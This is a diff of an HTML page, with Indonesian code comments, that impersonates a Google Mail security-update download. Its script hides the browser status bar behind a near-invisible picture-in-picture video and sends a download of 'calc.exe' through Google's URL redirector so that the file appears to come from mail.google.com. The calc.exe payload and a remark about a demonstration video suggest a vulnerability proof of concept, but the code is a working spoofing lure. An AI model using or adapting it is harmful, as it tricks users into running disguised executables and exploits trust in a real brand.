@@ -1,26 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Google Workspace - Secure Download</title>
+    <title>Security Update Confirmation</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; }
-        .btn { background-color: #1a73e8; color: white; padding: 15px 32px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        .btn:hover { background-color: #1765cc; }
-        video { display: none; } /* Video disembunyikan, hanya butuh streamnya untuk PiP */
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #ccc; padding: 20px; border-radius: 8px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        video { width: 1px; height: 1px; opacity: 0; } /* Video hampir tak terlihat */
     </style>
 </head>
 <body>
-    <h1>Download Document</h1>
-    <p>Please click the button below to start your secure download from Google Mail.</p>
-    
-    <!-- Tombol yang memicu dua aksi sekaligus -->
-    <button class="btn" id="downloadBtn">Download Securely</button>
+    <div class="box">
+        <h2>Your download is ready</h2>
+        <p>Click the button below to complete the security update from Google Mail.</p>
+        <button id="start">Download Update</button>
+    </div>
 
-    <video id="pipVideo" loop muted playsinline>
+    <!-- Video untuk memicu PiP -->
+    <video id="v" loop muted playsinline>
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
     </video>
 
-    <script src="script.js"></script>
+    <script>
+        const btn = document.getElementById('start');
+        const v = document.getElementById('v');
+
+        btn.addEventListener('click', async () => {
+            try {
+                // 1. Jalankan video
+                await v.play();
+                
+                // 2. Minta PiP untuk menutupi pojok kiri bawah (Status Bar)
+                // Catatan: Anda mungkin perlu memindahkan jendela PiP ke pojok kiri secara manual 
+                // di video demonstrasi untuk menunjukkan bagaimana area itu tertutup.
+                await v.requestPictureInPicture();
+
+                // 3. Gunakan URL Redirector Google untuk mempertahankan label "From mail.google.com"
+                const target = "https://www.google.com/url?q=https://bangbedul19-del.github.io/bedulsantuy1.github.io/calc.exe";
+                
+                // 4. Delay sedikit agar PiP muncul sempurna sebelum download terpicu
+                setTimeout(() => {
+                    const a = document.createElement('a');
+                    a.href = target;
+                    a.click();
+                }, 800);
+
+            } catch (e) {
+                console.error("PiP Error:", e);
+            }
+        });
+    </script>
 </body>
 </html>
